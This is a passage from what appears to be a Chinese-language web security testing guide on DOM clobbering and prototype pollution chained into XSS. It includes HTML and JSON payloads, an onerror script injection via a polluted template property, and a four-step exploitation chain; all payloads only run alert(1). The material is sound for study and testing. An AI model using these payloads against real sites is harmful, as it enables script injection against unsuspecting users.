## 八、DOM Clobbering与原型污染链式XSS

### 8.1 DOM Clobbering基础
利用HTML元素的`id`/`name`属性创建全局变量或覆盖DOM属性，劫持应用逻辑：
```html
<!-- id/name创建全局变量 -->
<form id=x></form>
<script>alert(x.constructor.constructor('alert(1)')())</script>

<!-- 覆盖document属性：经典Bootstrap 3 XSS（CVE-2025-1647） -->
<a id="close"></a><a name="defaultPrevented"></a>
<!-- 库代码读取element.defaultPrevented被污染 -->

<!-- clobber window属性 -->
<img name="x"> <script>window.x.outerHTML // 被覆盖</script>

<!-- 覆盖表单属性 -->
<form name="attributes"></form>  <!-- 污染attributes遍历 -->

<!-- clobber localStorage（老技巧） -->
<a id=localStorage></a>
```
**测试姿势**：注入`<a id=xxx>`/`<form name=xxx>`后在Console检查`window.xxx`是否被劫持，然后寻找库代码/应用代码读取该属性并进入sink。

### 8.2 原型污染→XSS
**原理**：通过`__proto__`/`constructor.prototype`污染`Object.prototype`，让后续对象读取到攻击者注入的属性值，改变库或应用预期行为：
```javascript
// 经典污染payload（JSON场景）
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
// 合并逻辑（深拷贝/merge/assign）缺陷是入口：
// Object.assign / lodash merge / jQuery.extend(true) / 各种deepMerge实现

// 污染后触发sink示例：库代码若执行
// el.innerHTML = options.template → 被污染的Object.prototype.template被读取
{"__proto__":{"template":"<img src=x onerror=alert(1)>"}}

// 配合前端框架
// Vue/React状态对象合并时的原型污染 → 组件渲染读取污染属性
```
**实战链**：
```
1. 找到JSON解析+深合并点（配置合并、query参数merge、localStorage恢复）
2. 注入 __proto__ 污染 Object.prototype 的特定属性
3. 找到读取该属性并写入sink（innerHTML/模板）的代码路径
4. 触发XSS
```
**已知案例**：jQuery <3.5原型污染（CVE-2019-11358）、DOMPurify CVE-2024-45801（原型污染削弱深度检查）、大量npm库deepMerge漏洞。

### 8.3 链式利用组合
- **原型污染 + mXSS**：CVE-2024-45801组合攻击（PP削弱深度检查→嵌套mXSS绕过）
- **DOM Clobbering + DOMPurify**：CVE-2026-49459组合攻击
- **Clobbering + CSP绕过**：覆盖库内部信任检查属性，诱导库执行gadget链
- **测试工具**：`clobbering` payload生成（https://github.com/yesmeck/jquery-xss-tests 参考）

